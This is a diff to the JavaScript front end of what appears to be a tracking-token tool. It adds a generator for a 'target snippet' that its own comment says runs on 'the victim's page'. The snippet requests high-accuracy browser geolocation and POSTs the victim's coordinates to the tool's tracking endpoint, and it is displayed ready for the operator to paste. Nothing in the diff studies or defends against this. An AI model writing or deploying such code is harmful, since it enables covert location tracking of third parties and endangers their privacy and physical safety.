@@ -59,8 +59,12 @@ document.getElementById('registerBtn').addEventListener('click', function(){
   }).then(function(j){
     var el = document.getElementById('registerResult');
     var url = (location.origin || '') + j.url;
+
+    // Build a target snippet that requests geolocation on the victim's page and POSTs it to the tracking endpoint
+    var geoTargetSnippet = '<script>\n(function(){\n  var url = ' + JSON.stringify(url) + ';\n  if(navigator.geolocation){\n    navigator.geolocation.getCurrentPosition(function(p){\n      try{\n        fetch(url, {\n          method: "POST",\n          headers: { "Content-Type": "application/json" },\n          body: JSON.stringify({ latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy })\n        });\n      }catch(e){console.error(e);}\n    }, function(e){ console.error('geolocation error', e); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });\n  }\n})();\n<\/script>';
+
     el.style.display = 'block';
-    el.textContent = 'Token: ' + j.token + '\nURL: ' + url + '\n\nSnippet:\n' + j.snippet.replace(/\\n/g,'\n');
+    el.textContent = 'Token: ' + j.token + '\nURL: ' + url + '\n\nSnippet:\n' + j.snippet.replace(/\\n/g,'\n') + '\n\nTarget snippet (with geolocation):\n' + geoTargetSnippet.replace(/\\n/g,'\n');
     btn.disabled = false;
     btn.textContent = 'Create tracking token';
   }).catch(function(err){
@@ -70,7 +74,7 @@ document.getElementById('registerBtn').addEventListener('click', function(){
   });
 });
 
-// Geolocation feature added per request
+// Geolocation feature added per request (admin UI)
 document.getElementById('geoBtn').addEventListener('click', function(){
   var btn = this;
   btn.disabled = true;
